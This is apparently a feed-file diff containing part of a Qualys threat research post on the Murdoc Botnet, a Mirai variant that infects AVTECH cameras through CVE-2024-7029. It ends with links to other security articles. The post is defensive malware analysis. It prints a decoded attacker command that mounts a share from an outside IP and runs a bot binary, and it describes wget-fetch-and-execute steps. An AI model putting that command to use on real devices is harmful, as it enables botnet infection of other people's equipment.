-&lt;figure class="wp-block-image size-full"&gt;&lt;img alt="" class="wp-image-37113" height="799" src="https://ik.imagekit.io/qualys/wp-content/uploads/2025/01/image5.png" width="826" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 5: Embedding Payloads by exploiting CVE-2024-7029&lt;/figcaption&gt;&lt;/figure&gt;
-
-
-
-&lt;figure class="wp-block-image size-full"&gt;&lt;img alt="" class="wp-image-37114" height="582" src="https://ik.imagekit.io/qualys/wp-content/uploads/2025/01/image6.png" width="826" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 6: Base64 encoded commands&lt;/figcaption&gt;&lt;/figure&gt;
-
-
-
-&lt;p&gt;&lt;/p&gt;
-
-
-
-&lt;p&gt;The decoded base64 encoded payload is:&lt;/p&gt;
-
-
-
-&lt;p&gt;cd /tmp; mkdir skid; mount -o intr,nolock,tcp,exec 45.148.121.58:/root/static skid; cd skid; ./meow.arm5 avtech;&lt;/p&gt;
-
-
-
-&lt;p&gt;The payload indicates that it is targeting AVTECH cameras.&lt;/p&gt;
-
-
-
-&lt;p&gt;In Figures 4 and Figure 5, we can see the embedded command line injection for the AVTECH camera, by which the malware binary:&lt;/p&gt;
-
-
-
-&lt;ul class="wp-block-list"&gt;
-&lt;li&gt;Using the wget/ftpget command, fetches the shellscript file.&lt;/li&gt;
-
-
-
-&lt;li&gt;Executes it and removes it.&lt;/li&gt;
-&lt;/ul&gt;
-
-
-
-&lt;p&gt;We discovered 500+ samples containing ELF files and ShellScript files. Each ShellScript is loaded onto devices such as IP cameras, Network devices, and IoT devices, and, in turn, the C2 server loads the new variant of Mirai botnet, i.e., Murdoc Botnet, into the devices. We have analyzed several samples; all use the same mechanism as the infection flow.&lt;/p&gt;
-
-
-
-&lt;h2 class="wp-block-heading" id="in-depth-shell-script-analysis"&gt;In-depth shell script analysis:&lt;/h2&gt;
-
-
-
-&lt;figure class="wp-block-image size-full"&gt;&lt;a href="https://ik.imagekit.io/qualys/wp-content/uploads/2025/01/image7.png"&gt;&lt;img alt="" class="wp-image-37115" height="456" src="https://ik.imagekit.io/qualys/wp-content/uploads/2025/01/image7.png" width="1360" /&gt;&lt;/a&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 7: Bash Script&lt;/figcaption&gt;&lt;/figure&gt;
-
-
-
-&lt;figure class="wp-block-image size-full"&gt;&lt;a href="https://ik.imagekit.io/qualys/wp-content/uploads/2025/01/image8.png"&gt;&lt;img alt="" class="wp-image-37116" height="804" src="https://ik.imagekit.io/qualys/wp-content/uploads/2025/01/image8.png" width="1365" /&gt;&lt;/a&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 8: Bash scripts indicate that the sample is targeting TPLINK&lt;/figcaption&gt;&lt;/figure&gt;
-
-
-
-&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;/p&gt;
-
-
-
-&lt;p&gt;Typically, as mentioned in the figures above, the malware shell script uses GTFOBins and does the following:&lt;/p&gt;
-
-
-
-&lt;ul class="wp-block-list"&gt;
-&lt;li&gt;Using wget command, fetches the payload.&lt;/li&gt;
-
-
-
-&lt;li&gt;Gives the execution permission to the payload using the chmod command.&lt;/li&gt;
-
-
-
-&lt;li&gt;Executes the payload.&lt;/li&gt;
-
-
-
-&lt;li&gt;Removes the payload.&lt;/li&gt;
-&lt;/ul&gt;
-
-
-
-&lt;figure class="wp-block-image size-large"&gt;&lt;img alt="" class="wp-image-37117" height="314" src="https://ik.imagekit.io/qualys/wp-content/uploads/2025/01/image9-1070x314.png" width="1070" /&gt;&lt;/figure&gt;
-
-
-
-&lt;p&gt;Figure 9: Botnet Deployment sample&lt;/p&gt;
-
-
-
-&lt;h2 class="wp-block-heading" id="affected-countries"&gt;&lt;strong&gt;Affected Countries&lt;/strong&gt;&lt;/h2&gt;
-
-
-
-&lt;p&gt;Upon a thorough examination of the IP addresses associated with the campaign activity, the Qualys Threat Research Team unveiled the geographical distribution of affected countries, with Malaysia occupying the foremost position, followed by Thailand, Mexico, and Indonesia.&lt;/p&gt;
-
-
-
-&lt;figure class="wp-block-image size-full"&gt;&lt;a href="https://ik.imagekit.io/qualys/wp-content/uploads/2025/01/image10.png"&gt;&lt;img alt="" class="wp-image-37118" height="899" src="https://ik.imagekit.io/qualys/wp-content/uploads/2025/01/image10.png" width="1431" /&gt;&lt;/a&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 10: Affected Countries&lt;/figcaption&gt;&lt;/figure&gt;
-
-
-
-&lt;h2 class="wp-block-heading" id="qualys-edr-coverage"&gt;Qualys EDR Coverage&lt;/h2&gt;
-
-
-
-&lt;p&gt;Qualys EDR detects the Murdoc Botnet Mirai malware variant.&lt;/p&gt;
-
-
-
-&lt;figure class="wp-block-image size-full"&gt;&lt;a href="https://ik.imagekit.io/qualys/wp-content/uploads/2025/01/image11.png"&gt;&lt;img alt="" class="wp-image-37119" height="823" src="https://ik.imagekit.io/qualys/wp-content/uploads/2025/01/image11.png" width="1430" /&gt;&lt;/a&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 11: Qualys Detection&lt;/figcaption&gt;&lt;/figure&gt;
-
-
-
-&lt;p&gt;&lt;/p&gt;
-
-
-
-&lt;figure class="wp-block-image size-full"&gt;&lt;a href="https://ik.imagekit.io/qualys/wp-content/uploads/2025/01/image12.png"&gt;&lt;img alt="" class="wp-image-37120" height="1429" src="https://ik.imagekit.io/qualys/wp-content/uploads/2025/01/image12.png" width="754" /&gt;&lt;/a&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 12: Multiple network connections detected by the sample&lt;/figcaption&gt;&lt;/figure&gt;
-
-
-
-&lt;p&gt;&lt;/p&gt;
-
-
-
-&lt;h2 class="wp-block-heading" id="conclusion-recommended-steps-to-protect-against-the-variant"&gt;Conclusion &amp;amp; Recommended Steps to Protect Against the Variant&lt;/h2&gt;
-
-
-
-&lt;p&gt;Our research initially started with the discovery and analysis of Murdoc Botnet binaries used for DDOS activities. Using Qualys EDR, threat intelligence data, and open-source intelligence (OSINT), we were able to attribute Murdoc Botnet as a Mirai variant.&lt;/p&gt;
-
-
-
-&lt;p&gt;We recommend the following measures for enterprise users and administrators to identify and protect against such attacks:&lt;/p&gt;
-
-
-
-&lt;ul class="wp-block-list"&gt;
-&lt;li&gt;Regularly monitor the suspicious processes, events, and network traffic spawned by the execution of any untrusted binary/scripts.&lt;/li&gt;
-
-
-
-&lt;li&gt;Always be cautious in executing shell scripts from unknown or untrusted sources.&lt;/li&gt;
-
-
-
-&lt;li&gt;Keep systems and firmware updated with the latest releases and patches.&lt;/li&gt;
-&lt;/ul&gt;
-
-
-
-&lt;h2 class="wp-block-heading" id="iocs"&gt;IOCs&lt;/h2&gt;
-
-
-
-&lt;p&gt;We have found 300+ x86 samples and 40+ x86_64 samples. Below are a few for your reference.&lt;/p&gt;
-
-
-
-&lt;figure class="wp-block-table"&gt;&lt;table class="has-fixed-layout"&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td&gt;&lt;strong&gt;sha256&lt;/strong&gt;&lt;/td&gt;&lt;td&gt;&amp;nbsp;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;c9fe390890a8b0586e8d5ac410685a7c4ed147858b10eb75459fa1afca8dc84d&lt;/td&gt;&lt;td&gt;&amp;nbsp;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;c0ae1eb249705f61d45ca747c91c02a411557a28792f4064c1d647abb580bc10&lt;/td&gt;&lt;td&gt;&amp;nbsp;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;f5aa93311d8dcde50d87ec010274fdd7a7653eed51264f0e2e648403ec4177d0&lt;/td&gt;&lt;td&gt;&amp;nbsp;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td colspan="2"&gt;76ebd9695aef87cc975d63b3a7a9ecc7d31bcd53a29e70ba97464a61e102cf52&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td colspan="2"&gt;7b1c7eb73f5d668c11af8f7131883863774902883ad95aa520a1eb203cf50fe1&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td colspan="2"&gt;10a08485432392fed90f3f3aaa7903566c57df5b27ed329a7d26a5b549d277e9&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td colspan="2"&gt;b63c93206417321b6e35e1accb8f667810c3e8a93978070d24f8382cc3d488dd&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td colspan="2"&gt;e127153563c1e9352067e94b28687828514734d583ca6bd89ad6e9b01be46170&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td colspan="2"&gt;34881ca6cff31098ed669fc379ca8b9d319aab5f14e0fb7d0b107a20ff1130e9&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td colspan="2"&gt;a49ef0e44fd98c411c6db940018183e9ec06af7f6f3a4c1ae0b92d745e697066&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td colspan="2"&gt;61c6767e74615917e29fc2d2342119ec81fa6794752966d4d7c9ef02545a4701&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td colspan="2"&gt;54fea8da696ddf115893858af924296d9229846cbd8afceca990a381b3363eb3&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td colspan="2"&gt;60fad3d03171353efea70a0e9a0c511d34c3bbd8f9f57bfa6e8d989cd858ba14&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td colspan="2"&gt;e4504f9329e03f782a75dd10cc4f849e17ef9a116b3b05dcc82e5d82c846ef68&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td colspan="2"&gt;2c365aded5c3f7422c72261c678b42edb2311ac9b2c0b9af444e5b3c2d734bd0&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td colspan="2"&gt;8f680ed38fa9229b7b3b53bf730526be633ff635c35df8537ef98ffb3e58e170&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td colspan="2"&gt;e87ad8c9586eeae7981ca0576764ceeeff93bbfcfa385703c5901b8d86d0194d&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td colspan="2"&gt;6b8ef346df6c002aaba3bcf91bed0ce8078a76e4600bcf86c08a6eef80d4c77a&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td colspan="2"&gt;60dc6802d55f1130f47ee631c245328250951e5d300942177fedae1845ab7912&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td colspan="2"&gt;5234086aff9cd88b6b25fa068a860e91f5faf8d457df60cb207b329c69c27c0d&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td colspan="2"&gt;c3b9ffca2b7f5c9fdefb39d6c13d657769ec140efd4513842dbc68adbad99efa&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td colspan="2"&gt;69405c640e224c981555509bd088ef759c584228f989e46d89e83483f9c2e4b7&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td colspan="2"&gt;978167c28a9c8f6f111ad18e1682d904989e8d72020e30144e1c0c8bb7fd3952&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td colspan="2"&gt;22ff790406cee6d81e191ef7e344e10bc722821506e5f7979e224747a21d8a87&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td colspan="2"&gt;f4308b08c0ca971a1420a5dca779d88b8172c29bc7238b723b43bb96d9b9a9e0&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td colspan="2"&gt;5577a035d1a5023edc5a404694ff4ed45a6b250bfce00f87a42b087e419970d0&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td colspan="2"&gt;5d6a900988bc42ad3e2b08253f01fa8090d0abc112d06410dd5d4e9f7aa02c42&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td colspan="2"&gt;b979fd33cb526a10ce9afbf3855d06c881b1bf55b0b6b1d10ebba5dc0d01c0c2&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td colspan="2"&gt;6552b87ddc2e6442e163c99e780f2549de5b78b56b8b91d8743ce61c55b1b558&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td colspan="2"&gt;b8b5efbeaffa06e67f7801476b062926cd3e26ff7d16968d6c4fe6aa8f6856eb&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td colspan="2"&gt;dc90a8edca7c5185dcca104cee44930f750e48b53d6ee712b3fcd8a6e6305225&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td colspan="2"&gt;99a0ab2a04a9cae3666a4baf52d35b4c623f1f41b5eb1519156ebe02d2afeceb&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td colspan="2"&gt;0db611e84182be1d6726c272214ae7977fc19b325ba0fc96f458a37365d7c4f2&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td colspan="2"&gt;ffa702f8681a58b52e70e445fc4daa8c2e909d6b20ab3eee635959f66672fd27&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td colspan="2"&gt;6230cf081bf077de1ad2a42fc0b0f04aeb213855373ebaa26ebff797a5d4096f&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/figure&gt;
-
-
-
-&lt;h2 class="wp-block-heading" id="ips"&gt;IPs&lt;/h2&gt;
-
-
-
-&lt;figure class="wp-block-table"&gt;&lt;table class="has-fixed-layout"&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td&gt;121[.]163[.]127[.]5&lt;/td&gt;&lt;td&gt;144[.]202[.]68[.]196&lt;/td&gt;&lt;td&gt;185[.]216[.]70[.]121&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;154[.]216[.]18[.]196&lt;/td&gt;&lt;td&gt;103[.]138[.]46[.]11&lt;/td&gt;&lt;td&gt;185[.]132[.]125[.]229&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;175[.]106[.]11[.]242&lt;/td&gt;&lt;td&gt;31[.]162[.]170[.]37&lt;/td&gt;&lt;td&gt;181[.]197[.]159[.]183&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;113[.]98[.]105[.]213&lt;/td&gt;&lt;td&gt;47[.]90[.]43[.]134&lt;/td&gt;&lt;td&gt;87[.]121[.]112[.]77&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;78[.]134[.]4[.]112&lt;/td&gt;&lt;td&gt;45[.]141[.]157[.]105&lt;/td&gt;&lt;td&gt;156[.]96[.]155[.]238&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;124[.]33[.]173[.]242&lt;/td&gt;&lt;td&gt;45[.]201[.]209[.]37&lt;/td&gt;&lt;td&gt;45[.]87[.]41[.]8&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;194[.]55[.]186[.]222&lt;/td&gt;&lt;td&gt;77[.]61[.]147[.]141&lt;/td&gt;&lt;td&gt;92[.]38[.]135[.]46&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;117[.]54[.]226[.]50&lt;/td&gt;&lt;td&gt;45[.]125[.]66[.]129&lt;/td&gt;&lt;td&gt;78[.]97[.]33[.]45&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;58[.]152[.]186[.]135&lt;/td&gt;&lt;td&gt;46[.]32[.]47[.]226&lt;/td&gt;&lt;td&gt;204[.]93[.]164[.]31&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;182[.]155[.]250[.]21&lt;/td&gt;&lt;td&gt;92[.]66[.]72[.]172&lt;/td&gt;&lt;td&gt;45[.]152[.]112[.]110&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;204[.]76[.]203[.]3&lt;/td&gt;&lt;td&gt;122[.]117[.]142[.]237&lt;/td&gt;&lt;td&gt;211[.]143[.]198[.]208&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;124[.]223[.]106[.]247&lt;/td&gt;&lt;td&gt;92[.]109[.]2[.]218&lt;/td&gt;&lt;td&gt;182[.]234[.]183[.]31&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;202[.]162[.]33[.]243&lt;/td&gt;&lt;td&gt;203[.]131[.]215[.]35&lt;/td&gt;&lt;td&gt;103[.]114[.]160[.]250&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;85[.]209[.]43[.]178&lt;/td&gt;&lt;td&gt;154[.]216[.]19[.]108&lt;/td&gt;&lt;td&gt;211[.]143[.]198[.]163&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;38[.]6[.]224[.]248&lt;/td&gt;&lt;td&gt;92[.]119[.]159[.]25&lt;/td&gt;&lt;td&gt;38[.]6[.]224[.]24&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;36[.]95[.]130[.]197&lt;/td&gt;&lt;td&gt;45[.]202[.]35[.]86&lt;/td&gt;&lt;td&gt;204[.]93[.]201[.]142&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;85[.]209[.]43[.]252&lt;/td&gt;&lt;td&gt;154[.]216[.]19[.]225&lt;/td&gt;&lt;td&gt;142[.]179[.]80[.]122&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;154[.]216[.]17[.]169&lt;/td&gt;&lt;td&gt;185[.]97[.]255[.]159&lt;/td&gt;&lt;td&gt;103[.]124[.]107[.]17&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;106[.]0[.]51[.]178&lt;/td&gt;&lt;td&gt;62[.]72[.]185[.]39&lt;/td&gt;&lt;td&gt;103[.]30[.]43[.]120&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;45[.]202[.]35[.]35&lt;/td&gt;&lt;td&gt;91[.]92[.]243[.]49&lt;/td&gt;&lt;td&gt;190[.]123[.]46[.]21&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;45[.]141[.]157[.]124&lt;/td&gt;&lt;td&gt;89[.]190[.]156[.]211&lt;/td&gt;&lt;td&gt;114[.]33[.]8[.]73&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;223[.]153[.]192[.]84&lt;/td&gt;&lt;td&gt;59[.]127[.]196[.]190&lt;/td&gt;&lt;td&gt;154[.]216[.]17[.]126&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/figure&gt;
-
-
-
-&lt;p&gt;&lt;/p&gt;
-
-
-
-&lt;h2 class="wp-block-heading" id="contributors"&gt;Contributors:&lt;/h2&gt;
-
-
-
-&lt;ul class="wp-block-list"&gt;
-&lt;li&gt;Siddartha Malladi, Security Researcher, Qualys &lt;/li&gt;
-&lt;/ul&gt;</content:encoded><guid isPermaLink="false">https://blog.qualys.com/?p=37108</guid><category>Vulnerabilities and Threat Research</category><category>botnet</category><category>Mirai</category><category>Murdoc Botnet</category></item><item><title>5 Best Endpoint Detection &amp; Response Solutions for 2025</title><link>https://www.techrepublic.com/article/best-edr-software/</link><description>Endpoint detection and response (EDR) software is the best way to detect, investigate, and respond to advanced attacks. Endpoint detection and response software is a security solution that protects against malware and other threats.</description><category>Cloud Security</category><category>Security</category><category>Top Products</category><category>best edr software</category><category>edr software</category></item><item><title>CISA Releases Three Industrial Control Systems Advisories</title><link>https://www.cisa.gov/news-events/alerts/2025/01/21/cisa-releases-three-industrial-control-systems-advisories</link><description>&lt;p&gt;CISA released three Industrial Control Systems (ICS) advisories on January 21, 2025. These advisories provide timely information about current security issues, vulnerabilities, and exploits surrounding ICS.&lt;/p&gt;
+&lt;p&gt;CISA and FBI strongly encourage network administrators and defenders to upgrade to the latest supported version of Ivanti CSA and to hunt for malicious activity on their networks using the detection methods and indicators of compromise (IOCs) provided in the advisory. All members of the cybersecurity community are also encouraged to visit CISA’s &lt;a href="https://www.cisa.gov/known-exploited-vulnerabilities-catalog" title="Known Exploited Vulnerabilities Catalog"&gt;Known Exploited Vulnerabilities Catalog&lt;/a&gt; to help better manage vulnerabilities and keep pace with threat activity. For more information and guidance on protection against the most common and impactful threats, tactics, techniques, and procedures, visit CISA’s &lt;a href="https://www.cisa.gov/cross-sector-cybersecurity-performance-goals" title="Cross-Sector Cybersecurity Performance Goals"&gt;Cross-Sector Cybersecurity Performance Goals&lt;/a&gt;.&lt;/p&gt;</description><guid isPermaLink="false">/node/22898</guid></item><item><title>Invisible Prompt Injection: A Threat to AI Security</title><link>https://www.trendmicro.com/en_us/research/25/a/invisible-prompt-injection-secure-ai.html</link><description>This article explains the invisible prompt injection, including how it works, an attack scenario, and how users can protect themselves.</description><guid isPermaLink="false">urn:uuid:82ec137d-6724-576d-02bd-64a68c66e576</guid><category>Trend Micro Research : Cloud</category><category>Trend Micro Research : Cyber Crime</category><category>Trend Micro Research : Expert Perspective</category><category>Trend Micro Research : Cyber Threats</category><category>Trend Micro Research : Endpoints</category><category>Trend Micro Research : Artificial Intelligence (AI)</category><category>Trend Micro Research : Articles, News, Reports</category></item><item><title>5 Best Endpoint Detection &amp; Response Solutions for 2025</title><link>https://www.techrepublic.com/article/best-edr-software/</link><description>Endpoint detection and response (EDR) software is the best way to detect, investigate, and respond to advanced attacks. Endpoint detection and response software is a security solution that protects against malware and other threats.</description><category>Cloud Security</category><category>Security</category><category>Top Products</category><category>best edr software</category><category>edr software</category></item><item><title>CISA Releases Three Industrial Control Systems Advisories</title><link>https://www.cisa.gov/news-events/alerts/2025/01/21/cisa-releases-three-industrial-control-systems-advisories</link><description>&lt;p&gt;CISA released three Industrial Control Systems (ICS) advisories on January 21, 2025. These advisories provide timely information about current security issues, vulnerabilities, and exploits surrounding ICS.&lt;/p&gt;
 &lt;ul&gt;
 &lt;li&gt;ICSA-25-021-01 &lt;a href="https://www.cisa.gov/news-events/ics-advisories/icsa-25-021-01"&gt;Traffic Alert and Collision Avoidance System (TCAS) II&lt;/a&gt;&lt;/li&gt;
 &lt;li&gt;ICSA-25-021-02 &lt;a href="https://www.cisa.gov/news-events/ics-advisories/icsa-25-021-02"&gt;Siemens SIMATIC S7-1200 CPUs&lt;/a&gt;&lt;/li&gt;
